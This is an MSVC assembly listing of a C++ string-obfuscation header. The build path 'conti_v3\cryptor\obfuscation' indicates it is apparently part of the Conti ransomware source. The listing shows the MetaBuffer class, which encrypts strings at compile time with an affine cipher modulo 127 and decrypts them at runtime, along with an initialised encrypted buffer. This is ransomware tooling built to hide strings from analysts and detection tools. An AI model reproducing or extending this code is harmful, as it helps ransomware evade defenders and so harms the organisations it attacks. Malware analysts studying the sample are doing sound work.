COMDAT

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00000	c6 01 00	 mov	 BYTE PTR [rcx], 0
  00003	c6 41 01 31	 mov	 BYTE PTR [rcx+1], 49	; 00000031H
  00007	c6 41 02 24	 mov	 BYTE PTR [rcx+2], 36	; 00000024H
  0000b	c6 41 03 65	 mov	 BYTE PTR [rcx+3], 101	; 00000065H
  0000f	c6 41 04 24	 mov	 BYTE PTR [rcx+4], 36	; 00000024H
  00013	c6 41 05 00	 mov	 BYTE PTR [rcx+5], 0
  00017	c6 41 06 24	 mov	 BYTE PTR [rcx+6], 36	; 00000024H
  0001b	c6 41 07 2c	 mov	 BYTE PTR [rcx+7], 44	; 0000002cH
  0001f	c6 41 08 24	 mov	 BYTE PTR [rcx+8], 36	; 00000024H
  00023	c6 41 09 0a	 mov	 BYTE PTR [rcx+9], 10
  00027	c6 41 0a 24	 mov	 BYTE PTR [rcx+10], 36	; 00000024H
  0002b	c6 41 0b 5f	 mov	 BYTE PTR [rcx+11], 95	; 0000005fH
  0002f	c6 41 0c 24	 mov	 BYTE PTR [rcx+12], 36	; 00000024H
  00033	c6 41 0d 65	 mov	 BYTE PTR [rcx+13], 101	; 00000065H
  00037	c6 41 0e 24	 mov	 BYTE PTR [rcx+14], 36	; 00000024H
  0003b	c6 41 0f 00	 mov	 BYTE PTR [rcx+15], 0
  0003f	c6 41 10 24	 mov	 BYTE PTR [rcx+16], 36	; 00000024H
  00043	c6 41 11 50	 mov	 BYTE PTR [rcx+17], 80	; 00000050H
  00047	c6 41 12 24	 mov	 BYTE PTR [rcx+18], 36	; 00000024H
  0004b	c6 41 13 6f	 mov	 BYTE PTR [rcx+19], 111	; 0000006fH
  0004f	c6 41 14 24	 mov	 BYTE PTR [rcx+20], 36	; 00000024H
  00053	c6 41 15 2d	 mov	 BYTE PTR [rcx+21], 45	; 0000002dH
  00057	c6 41 16 24	 mov	 BYTE PTR [rcx+22], 36	; 00000024H
  0005b	c6 41 17 14	 mov	 BYTE PTR [rcx+23], 20
  0005f	c6 41 18 24	 mov	 BYTE PTR [rcx+24], 36	; 00000024H
  00063	c6 41 19 65	 mov	 BYTE PTR [rcx+25], 101	; 00000065H
  00067	c6 41 1a 24	 mov	 BYTE PTR [rcx+26], 36	; 00000024H
  0006b	c6 41 1b 53	 mov	 BYTE PTR [rcx+27], 83	; 00000053H
  0006f	c6 41 1c 24	 mov	 BYTE PTR [rcx+28], 36	; 00000024H
  00073	c6 41 1d 23	 mov	 BYTE PTR [rcx+29], 35	; 00000023H
  00077	c6 41 1e 24	 mov	 BYTE PTR [rcx+30], 36	; 00000024H
  0007b	c6 41 1f 6f	 mov	 BYTE PTR [rcx+31], 111	; 0000006fH
  0007f	c6 41 20 24	 mov	 BYTE PTR [rcx+32], 36	; 00000024H
  00083	c6 41 21 5b	 mov	 BYTE PTR [rcx+33], 91	; 0000005bH
  00087	c6 41 22 24	 mov	 BYTE PTR [rcx+34], 36	; 00000024H
  0008b	c6 41 23 14	 mov	 BYTE PTR [rcx+35], 20
  0008f	c6 41 24 24	 mov	 BYTE PTR [rcx+36], 36	; 00000024H
  00093	c6 41 25 42	 mov	 BYTE PTR [rcx+37], 66	; 00000042H
  00097	c6 41 26 24	 mov	 BYTE PTR [rcx+38], 36	; 00000024H
  0009b	c6 41 27 30	 mov	 BYTE PTR [rcx+39], 48	; 00000030H
  0009f	c6 41 28 24	 mov	 BYTE PTR [rcx+40], 36	; 00000024H
  000a3	c6 41 29 53	 mov	 BYTE PTR [rcx+41], 83	; 00000053H
  000a7	c6 41 2a 24	 mov	 BYTE PTR [rcx+42], 36	; 00000024H
  000ab	c6 41 2b 31	 mov	 BYTE PTR [rcx+43], 49	; 00000031H
  000af	c6 41 2c 24	 mov	 BYTE PTR [rcx+44], 36	; 00000024H
  000b3	c6 41 2d 65	 mov	 BYTE PTR [rcx+45], 101	; 00000065H
  000b7	c6 41 2e 24	 mov	 BYTE PTR [rcx+46], 36	; 00000024H
  000bb	c6 41 2f 00	 mov	 BYTE PTR [rcx+47], 0
  000bf	c6 41 30 24	 mov	 BYTE PTR [rcx+48], 36	; 00000024H
  000c3	c6 41 31 64	 mov	 BYTE PTR [rcx+49], 100	; 00000064H
  000c7	c6 41 32 24	 mov	 BYTE PTR [rcx+50], 36	; 00000024H
  000cb	c6 41 33 6f	 mov	 BYTE PTR [rcx+51], 111	; 0000006fH
  000cf	c6 41 34 24	 mov	 BYTE PTR [rcx+52], 36	; 00000024H
  000d3	c6 41 35 42	 mov	 BYTE PTR [rcx+53], 66	; 00000042H
  000d7	c6 41 36 24	 mov	 BYTE PTR [rcx+54], 36	; 00000024H
  000db	c6 41 37 00	 mov	 BYTE PTR [rcx+55], 0
  000df	c6 41 38 24	 mov	 BYTE PTR [rcx+56], 36	; 00000024H
  000e3	c6 41 39 36	 mov	 BYTE PTR [rcx+57], 54	; 00000036H
  000e7	c6 41 3a 24	 mov	 BYTE PTR [rcx+58], 36	; 00000024H
  000eb	c6 41 3b 05	 mov	 BYTE PTR [rcx+59], 5
  000ef	c6 41 3c 24	 mov	 BYTE PTR [rcx+60], 36	; 00000024H
  000f3	c6 41 3d 05	 mov	 BYTE PTR [rcx+61], 5
  000f7	c6 41 3e 24	 mov	 BYTE PTR [rcx+62], 36	; 00000024H
  000fb	c6 41 3f 4c	 mov	 BYTE PTR [rcx+63], 76	; 0000004cH
  000ff	c6 41 40 24	 mov	 BYTE PTR [rcx+64], 36	; 00000024H
  00103	c6 41 41 05	 mov	 BYTE PTR [rcx+65], 5
  00107	c6 41 42 24	 mov	 BYTE PTR [rcx+66], 36	; 00000024H
  0010b	c6 41 43 53	 mov	 BYTE PTR [rcx+67], 83	; 00000053H
  0010f	c6 41 44 24	 mov	 BYTE PTR [rcx+68], 36	; 00000024H
  00113	c6 41 45 4a	 mov	 BYTE PTR [rcx+69], 74	; 0000004aH
  00117	c6 41 46 24	 mov	 BYTE PTR [rcx+70], 36	; 00000024H
  0011b	c6 41 47 53	 mov	 BYTE PTR [rcx+71], 83	; 00000053H
  0011f	c6 41 48 24	 mov	 BYTE PTR [rcx+72], 36	; 00000024H
  00123	c6 41 49 07	 mov	 BYTE PTR [rcx+73], 7
  00127	c6 41 4a 24	 mov	 BYTE PTR [rcx+74], 36	; 00000024H
  0012b	c6 41 4b 14	 mov	 BYTE PTR [rcx+75], 20
  0012f	c6 41 4c 24	 mov	 BYTE PTR [rcx+76], 36	; 00000024H
  00133	c6 41 4d 3d	 mov	 BYTE PTR [rcx+77], 61	; 0000003dH
  00137	c6 41 4e 24	 mov	 BYTE PTR [rcx+78], 36	; 00000024H
  0013b	c6 41 4f 24	 mov	 BYTE PTR [rcx+79], 36	; 00000024H
  0013f	c6 41 50 24	 mov	 BYTE PTR [rcx+80], 36	; 00000024H

; 51   :         : m_buffer{ encrypt(data[Ints])... }
; 52   :     {
; 53   : 
; 54   :     }

  00143	0f b6 41 01	 movzx	 eax, BYTE PTR [rcx+1]
  00147	48 8b c1	 mov	 rax, rcx
  0014a	c3		 ret	 0
??0?$MetaBuffer@$0DN@$0CE@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@$0DO@$0DP@$0EA@$0EB@$0EC@$0ED@$0EE@$0EF@$0EG@$0EH@$0EI@$0EJ@$0EK@$0EL@$0EM@$0EN@$0EO@$0EP@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >::MetaBuffer<61,36,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79> >
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 03 00 00 00	 mov	 ecx, 3
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 1b	 imul	 r8d, ecx, 27

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z PROC ; MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 2f	 imul	 r8d, eax, 47		; 0000002fH
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 03	 add	 r8d, 3
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ PROC ; MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0CP@$02U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@$0DE@$0DF@$0DG@$0DH@$0DI@$0DJ@$0DK@$0DL@$0DM@$0DN@@std@@@@QEBA_NXZ ENDP ; MetaBuffer<47,3,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?decrypt@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt, COMDAT

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00000	0f b6 c2	 movzx	 eax, dl
  00003	b9 5c 00 00 00	 mov	 ecx, 92			; 0000005cH
  00008	2b c8		 sub	 ecx, eax

; 40   :     return (a % n + n) % n;

  0000a	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  0000f	44 6b c1 23	 imul	 r8d, ecx, 35		; 00000023H

; 40   :     return (a % n + n) % n;

  00013	41 f7 e8	 imul	 r8d
  00016	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  0001b	41 03 d0	 add	 edx, r8d
  0001e	c1 fa 06	 sar	 edx, 6
  00021	8b ca		 mov	 ecx, edx
  00023	c1 e9 1f	 shr	 ecx, 31
  00026	03 d1		 add	 edx, ecx
  00028	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  0002b	44 2b c1	 sub	 r8d, ecx
  0002e	41 83 c0 7f	 add	 r8d, 127		; 0000007fH
  00032	41 f7 e8	 imul	 r8d
  00035	41 03 d0	 add	 edx, r8d
  00038	c1 fa 06	 sar	 edx, 6
  0003b	8b ca		 mov	 ecx, edx
  0003d	c1 e9 1f	 shr	 ecx, 31
  00040	03 d1		 add	 edx, ecx
  00042	6b ca 7f	 imul	 ecx, edx, 127		; 0000007fH
  00045	44 2b c1	 sub	 r8d, ecx

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00048	41 0f b6 c0	 movzx	 eax, r8b

; 81   :     }

  0004c	c3		 ret	 0
?decrypt@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::decrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$dead$ = 8
byte$ = 16
?encrypt@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z PROC ; MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt, COMDAT

; 75   :         return (A * byte + B) % 127;

  00000	0f b6 c2	 movzx	 eax, dl
  00003	44 6b c0 1d	 imul	 r8d, eax, 29
  00007	b8 11 08 04 02	 mov	 eax, 33818641		; 02040811H
  0000c	41 83 c0 5c	 add	 r8d, 92			; 0000005cH
  00010	41 f7 e0	 mul	 r8d
  00013	41 8b c8	 mov	 ecx, r8d
  00016	2b ca		 sub	 ecx, edx
  00018	d1 e9		 shr	 ecx, 1
  0001a	03 ca		 add	 ecx, edx
  0001c	c1 e9 06	 shr	 ecx, 6
  0001f	6b c9 7f	 imul	 ecx, ecx, 127		; 0000007fH
  00022	44 2b c1	 sub	 r8d, ecx
  00025	41 0f b6 c0	 movzx	 eax, r8b

; 76   :     }

  00029	c3		 ret	 0
?encrypt@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@AEBAEE@Z ENDP ; MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::encrypt
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?isDecrypted@?$MetaBuffer@$0BN@$0FM@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@$0BG@$0BH@$0BI@$0BJ@$0BK@$0BL@$0BM@$0BN@$0BO@$0BP@$0CA@$0CB@$0CC@$0CD@$0CE@$0CF@$0CG@$0CH@$0CI@$0CJ@$0CK@$0CL@$0CM@$0CN@$0CO@$0CP@$0DA@$0DB@$0DC@$0DD@@std@@@@QEBA_NXZ PROC ; MetaBuffer<29,92,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51> >::isDecrypted, COMDAT

; 58   :         return m_isDecrypted;

  00000	0f b6 01	 movzx	 eax, BYTE PTR [rcx]

; 59   :     }

  00003	c3		 ret	 0
